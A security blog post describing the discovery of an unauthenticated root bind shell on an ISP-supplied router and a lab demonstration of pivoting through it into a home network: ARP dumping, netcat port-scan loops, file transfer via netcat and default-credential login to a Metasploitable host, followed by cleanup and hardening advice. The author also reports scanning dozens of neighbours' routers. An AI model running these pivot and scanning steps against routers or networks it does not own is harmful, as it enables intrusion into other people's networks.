---
title: "Pivot Into A Network Using A Compromised Router"
layout: post
---

<img src="/assets/images/casual/router/router-icon.png" alt="Logo" width="20%"> <br>
<!-- Download <a href="https://github.com/helich0pper/Karkinos" target="_blank">Karkinos</a>. -->

# Disclaimer

<div style="text-align:justify">Do not replicate any steps in this blog post on networks/routers that you do not own.</div>

<hr>

# Evil or Reckless ISP?

I recently had a router setup by my ISP for casual internet usage, nothing out of the ordinary. While casually going over the router configurations, I spotted a command injection attempt in one of the input fields. Either this router ships with this configuration, or it was my ISP. <br>
It is possible that a bot is picking off new routers as they join the network with default credentials (admin  ::  admin).

<img src="/assets/images/casual/router/command-injection.png" alt="Logo"> <br>

This looks a lot like a bind shell; the port is also open and listening on the router. 

```
root@kali# nmap -p 40001 router-ip 
```

<img src="/assets/images/casual/router/nmap-open.png" alt="Logo"> <br>

Connecting to the port with Netcat prompts an interactive shell with root privileges. The bind shell is working... 

```
root@kali# rlwrap nc router-ip 40001
```

<img src="/assets/images/casual/router/netcat-connect.png" alt="Logo"> <br>

The bind shells are present on almost all routers on my subnet, it must be used by my ISP for some remote maintenance. I detected 55 routers that have this bind shell, and I didn't scan them all...

<img src="/assets/images/casual/router/vuln-ips.png" alt="Logo"> <br>

Unsure if the ISP has good or bad intentions, but this is a gold mine for malicious actors. <br> <br> The bind shell can be accessed by anyone and does not require authentication. This can be abused to access machines on the internal network. Let's test it on my network.

# Pivoting Into The Network Through The Router

This is a simplified network topology of what the setup for this demo looks like; where the "Attacker" machine cannot directly access the internal network.
<img src="/assets/images/casual/router/fig-wrong.png" alt="Logo"> <br>

Our target is the Metaspoitable machine with the IP address "192.168.1.108". The router will be used to pivot into the network and exploit the target.

<img src="/assets/images/casual/router/fig-correct.png" alt="Logo"> <br>

The ARP cache stored on the router can be used to reveal IP addresses on the internal network, including our target "192.168.1.108". Dump all the entries with the arp command. 

```
router@shell# arp -a
```

<img src="/assets/images/casual/router/arp-table.png" alt="Logo"> <br>

Use awk to clean this up and return only the IPs.

```
router@shell# arp -a | awk -F "(" {'print $2'} | awk -F ")" {'print $1'}
```

<img src="/assets/images/casual/router/arp-awk.png" alt="Logo"> <br>

## Using busybox 

Busybox contains common UNIX utilities, scripts, and tools that are packed into one single binary. It is typically used in systems with environment constraints like low storage/memory (eg. a Linux-based microcontroller or a router). <a href="https://www.youtube.com/watch?v=wWA6SvzvElU" target="_blank">Learn more</a>.

<img src="/assets/images/casual/router/help-busybox.png" alt="Logo"> <br>

To verify "192.168.1.108" is the Metasploitable machine, Netcat can be used to perform a port scan. This router's busybox binary contains a minimal version of Netcat that does not support any options. 

<img src="/assets/images/casual/router/netcat-usage.png" alt="Logo"> <br>

# Port Scanning With Netcat
## Without using the -sv option

Since there is no options in this Netcat version, a little /dev/null magic is needed. A quick bash script can be used to scan our target for open TCP ports from range 1-1000. Skip ahead if you prefer the complete Netcat binary.

```bash
#!/bin/sh

for i in $(seq 1 1000)
do 
        if nc 192.168.1.108 $i </dev/null 2>&1 | grep -q refused;
        then :
        else 
                echo "Port $i is open"
        fi
done
````

It can also be pasted into the terminal as a one-liner.

```bash
router@shell# for i in $(seq 1 1000); do if nc 192.168.1.108 $i </dev/null 2>&1 | grep -q refused;then :;else echo "Port $i is open";fi; done
```

<img src="/assets/images/casual/router/port-scan.png" alt="Logo"> <br>

It's pretty fast too:

<img src="/assets/images/casual/router/port-scan.gif" alt="Logo"> <br>

To provide more accurate and responsive results, I copied an alternative busybox binary found <a href="https://github.com/darkerego/mips-binaries" target="_blank">here</a> to the router. busybox-mips contains the complete version of Netcat with the options you'd expect to see. You could compile Nmap yourself and use that instead, more on that later.<br>

On Kali
```
root@kali# nc -lnvp 5001 < busybox-mips
```

On the router
```
router@shell# nc kali-ip 5001 > busybox-mips
```

Before: <br>
<img src="/assets/images/casual/router/before-busybox.png" alt="Logo"> <br>

After: <br>
<img src="/assets/images/casual/router/after-busybox.png" alt="Logo"> <br>

With this version, the "-zv" options can be used to detect if a port is open or not. 

## Using the -sv option

```
router@shell# ./busybox-mips nc 192.168.1.108 22 -zv
```
<img src="/assets/images/casual/router/netcat-one.png" alt="Logo"> <br>

The scripts used before can also be used with the new Netcat binary, after some slight modifications of course.

```bash
#!/bin/sh

for i in $(seq 1 1000)
do 
   ./busybox-mips nc 192.168.1.108 $i -zv 2>&1 | grep open
done
````

It can also be pasted into the terminal as a one-liner.

```bash
router@shell# for i in $(seq 1 1000);do ./busybox-mips nc 192.168.1.108 $i -zv 2>&1 | grep open; done
```

<img src="/assets/images/casual/router/netcat-all.png" alt="Logo"> <br>

The following syntax works on some Netcat versions to scan a range of ports, try your luck.
```
# nc ip 1-1000 -zv 
```

Other binaries can also be compiled and uploaded using the same methodology, Nmap included. Keep in mind the router's architecture and endianness before compiling or it won't work! <a href="http://papermint-designs.com/dmo-blog/2016-04-having-fun-with-your-home-router" target="_blank">Read more</a>

# Compromising The Target

We can now communicate with the Metasploitable machine through the compromised router. For example, I'll login to the FTP server on port 21. <br> 

<img src="/assets/images/casual/router/telnet-ftp.png" alt="Logo"> <br>

This FTP server (vsFTPd 2.3.4) is vulnerable, but that's not our goal today ;)

<img src="/assets/images/casual/router/searchsploit-ftp.png" alt="Logo"> <br>

Knowing this is Metasploitable, I can connect to port 23 with telnet for a login prompt.

<img src="/assets/images/casual/router/metasploitable-telnet.png" alt="Logo"> <br>

The default credentials are:
```
msfadmin  ::  msfadmin
```

We are now inside the network on a compromised host. While exploiting Metasploitable is trivial, having your machine exposed to the internet like this is not a great idea.

<img src="/assets/images/casual/router/metasploitable-ifconfig.png" alt="Logo"> <br>

## What else can be done?
Other attacks can be done too such as:
* Man In The Middle Attacks (MITM) to intercept/modify unencrypted traffic on the network
* SSL stripping to downgrade your HTTPS traffic to HTTP. HSTS protected sites excluded :<
* Redirect traffic to a malicious DNS server which can be used to steal information or restrict access to certain websites
* Modify or completely replace the router firmware with a malicious one
* More shit, I'm no pro :)

# Cleaning this mess up

My first steps:

* Remove the command injection payload
* Set a strong password for the admin page
* Disable remote management

<img src="/assets/images/casual/router/disable-ftp.png" alt="Logo"> <br>

<img src="/assets/images/casual/router/router-remote.png" alt="Logo"> <br>

Find the process ID (PID) of the bind shell on the router

```
router@shell# ps | grep 40001
```

<img src="/assets/images/casual/router/ps-grep.png" alt="Logo"> <br>

Kill the process and make sure the bind shell is no longer listening.

```
router@shell# kill -9 20685 
```

<img src="/assets/images/casual/router/ps-kill.png" alt="Logo"> <br>

Run a port scan on your router to find unusual ports listening/open. 80 and 443 are typically used to log in to the admin page which is fine for me.

```
# nmap -p- -sT -T3 router-ip
```

<img src="/assets/images/casual/router/nmap-all.png" alt="Logo"> <br>

<hr>

# Conclusion
Configure your routers with SSH and use proper authentication measures. Having an insecure Telnet backdoor on a random high port can be quickly discovered by scanning the full port range (0-65535) with Nmap. <br> 
I hope opening random bind shells is not a common practice amongst Internet Service Providers lol, check your routers. Do not discard the idea that this may be a malicous bot. In any case, try your best to avoid cheap and outdated routers.

<hr>







